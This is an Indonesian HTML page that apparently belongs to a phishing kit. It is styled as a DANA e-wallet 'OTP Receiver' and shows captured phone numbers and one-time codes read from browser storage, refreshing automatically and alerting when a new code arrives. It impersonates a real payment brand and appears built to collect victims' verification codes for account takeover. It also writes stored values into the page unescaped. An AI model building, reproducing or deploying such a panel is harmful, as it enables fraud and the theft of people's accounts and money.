<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Receiver OTP - DANA</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            font-family: 'Inter', 'Segoe UI', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .card-receiver {
            background: #1a1a2e;
            border: 1px solid #2a2a4e;
            border-radius: 28px;
            padding: 32px 24px;
            max-width: 420px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
        }
        .logo {
            text-align: center;
            margin-bottom: 24px;
        }
        .logo .brand {
            font-size: 28px;
            font-weight: 700;
            color: #0080ff;
        }
        .logo .brand span { color: #fff; }
        .logo .sub {
            color: #6a6a8a;
            font-size: 13px;
        }

        .badge-status {
            background: #0080ff;
            color: #fff;
            padding: 4px 16px;
            border-radius: 60px;
            font-size: 12px;
            font-weight: 600;
            display: inline-block;
        }

        .otp-box {
            background: #0a0a1a;
            border: 2px solid #2a2a4e;
            border-radius: 16px;
            padding: 20px;
            text-align: center;
            margin: 16px 0;
        }
        .otp-box .label {
            color: #6a6a8a;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .otp-box .value {
            font-size: 36px;
            font-weight: 700;
            color: #00ff44;
            font-family: monospace;
            letter-spacing: 6px;
            margin: 8px 0;
        }
        .otp-box .phone {
            color: #8a8aaa;
            font-size: 14px;
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            padding: 10px 0;
            border-bottom: 1px solid #1a1a2e;
            color: #c0c0e0;
            font-size: 14px;
        }
        .info-row:last-child {
            border-bottom: none;
        }
        .info-row .label { color: #6a6a8a; }
        .info-row .value { color: #fff; font-weight: 500; }

        .btn-refresh {
            background: transparent;
            border: 2px solid #2a2a4e;
            border-radius: 60px;
            padding: 10px;
            color: #8a8aaa;
            width: 100%;
            transition: 0.3s;
            font-size: 14px;
        }
        .btn-refresh:hover {
            border-color: #0080ff;
            color: #0080ff;
        }

        .footer-text {
            text-align: center;
            color: #4a4a6a;
            font-size: 12px;
            margin-top: 20px;
            border-top: 1px solid #1a1a2e;
            padding-top: 16px;
        }
        .footer-text strong { color: #0080ff; }

        .empty-state {
            text-align: center;
            color: #4a4a6a;
            padding: 30px 0;
        }
        .empty-state i {
            font-size: 48px;
            color: #2a2a4e;
            margin-bottom: 12px;
        }
        .empty-state h5 {
            color: #8a8aaa;
            font-weight: 500;
        }

        .toast-container {
            position: fixed;
            bottom: 24px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 9999;
            background: #1a1a2e;
            color: #fff;
            padding: 12px 24px;
            border-radius: 60px;
            font-size: 14px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
            display: none;
        }
    </style>
</head>
<body>

<div class="card-receiver">

    <div class="logo">
        <div class="brand">D<span>A</span>N<span>A</span></div>
        <div class="sub">Receiver OTP System</div>
        <div class="badge-status" style="margin-top:8px;"><i class="bi bi-dot"></i> Live</div>
    </div>

    <!-- ===== OTP DATA ===== -->
    <div id="otpContent">
        <!-- Dynamic content from JavaScript -->
    </div>

    <button class="btn-refresh" onclick="loadOtp()">
        <i class="bi bi-arrow-clockwise"></i> Refresh Data
    </button>

    <div class="footer-text">
        &copy; 2026 <strong>DANA</strong> — OTP Receiver
    </div>
</div>

<!-- ===== TOAST ===== -->
<div class="toast-container" id="toast">✅ Data diperbarui</div>

<script>
    // ============================================================
    // RECEIVER — TAMPILKAN OTP DARI LOCALSTORAGE
    // ============================================================

    function loadOtp() {
        const container = document.getElementById('otpContent');
        const data = localStorage.getItem('dana_otp_data');

        if (!data) {
            container.innerHTML = `
                <div class="empty-state">
                    <i class="bi bi-inbox"></i>
                    <h5>Belum ada OTP masuk</h5>
                    <p style="font-size:13px;color:#4a4a6a;">Tunggu user mengirim OTP dari halaman utama</p>
                </div>
            `;
            return;
        }

        try {
            const parsed = JSON.parse(data);
            const phone = parsed.phone || '-';
            const otp = parsed.otp || '------';
            const timestamp = parsed.timestamp ? new Date(parsed.timestamp).toLocaleString('id-ID') : '-';
            const status = parsed.status || 'pending';

            container.innerHTML = `
                <div class="otp-box">
                    <div class="label">KODE OTP MASUK</div>
                    <div class="value">${otp}</div>
                    <div class="phone">📱 ${phone}</div>
                </div>

                <div class="info-row">
                    <span class="label">Status</span>
                    <span class="value" style="color:#00ff44;">${status === 'pending' ? 'Menunggu Verifikasi' : 'Sudah Diverifikasi'}</span>
                </div>
                <div class="info-row">
                    <span class="label">Dikirim</span>
                    <span class="value">${timestamp}</span>
                </div>
                <div class="info-row">
                    <span class="label">User Agent</span>
                    <span class="value" style="font-size:11px;color:#6a6a8a;">${navigator.userAgent.substring(0, 50)}...</span>
                </div>
            `;

            showToast('✅ Data OTP berhasil dimuat');

        } catch(e) {
            container.innerHTML = `
                <div class="empty-state">
                    <i class="bi bi-exclamation-triangle" style="color:#ff8800;"></i>
                    <h5>Data rusak</h5>
                    <p style="font-size:13px;color:#4a4a6a;">Silakan refresh atau kirim ulang OTP</p>
                </div>
            `;
        }
    }

    // ===== TOAST =====
    function showToast(message) {
        const toast = document.getElementById('toast');
        toast.textContent = message;
        toast.style.display = 'block';
        setTimeout(() => {
            toast.style.display = 'none';
        }, 3000);
    }

    // ===== AUTO REFRESH =====
    loadOtp();

    // Refresh setiap 5 detik
    setInterval(loadOtp, 5000);

    // ===== LISTENER LOCALSTORAGE (cross-tab) =====
    window.addEventListener('storage', function(e) {
        if (e.key === 'dana_otp_data') {
            loadOtp();
            showToast('📩 OTP baru masuk!');
        }
    });
</script>

</body>
</html>
